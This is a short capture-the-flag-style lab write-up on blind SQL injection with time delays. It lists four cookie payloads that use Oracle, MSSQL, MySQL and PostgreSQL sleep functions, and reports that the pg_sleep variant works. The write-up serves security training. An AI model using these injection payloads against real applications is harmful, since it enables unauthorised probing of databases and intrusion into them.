# Blind SQL injection with time delays
# Objective
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\
\
The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.\
\
To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.

# Solution
Expected query structure concerning TrackingId:
```
SELECT TrackingId FROM TrackingIdTable WHERE TrackingId='8e4W3X5FoxstfJs7'
```
## Testing different payloads
Cookie value: `TrackingId=gXuHtQt4c0FElUwR' || dbms_pipe.receive_message(('a'),10)--` does not work\
Cookie value: `TrackingId=gXuHtQt4c0FElUwR' || WAITFOR DELAY '0:0:10'--` does not work\
Cookie value: `TrackingId=gXuHtQt4c0FElUwR' || (select sleep(10))--` does not work\
Cookie value: `TrackingId=gXuHtQt4c0FElUwR' || (select pg_sleep(10))--` WORKS
